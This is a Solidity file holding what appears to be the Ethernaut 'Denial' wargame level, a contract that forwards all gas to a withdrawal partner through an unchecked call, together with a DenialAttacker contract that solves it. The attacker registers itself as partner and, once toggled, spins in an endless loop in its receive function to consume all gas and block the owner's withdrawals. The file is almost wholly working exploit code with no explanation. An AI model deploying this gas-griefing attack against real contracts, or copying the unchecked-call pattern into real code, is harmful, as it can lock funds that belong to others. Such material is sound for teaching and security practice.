// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

interface DenialI {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract DenialAttacker {
    DenialI public deniaI;
    bool public toggle;
    address private owner;

    constructor(address _denial) {
        deniaI = DenialI(_denial);
        owner = msg.sender;
    }

    function hack() public {
        require(msg.sender == owner, "Only owner");
        deniaI.setWithdrawPartner(address(this));
        deniaI.withdraw();
    }

    function ddosSwith() public {
        require(msg.sender == owner, "Only owner");
        toggle = !toggle;
    }

    receive() external payable {
        while (toggle == true) {
            
        }
    }
}
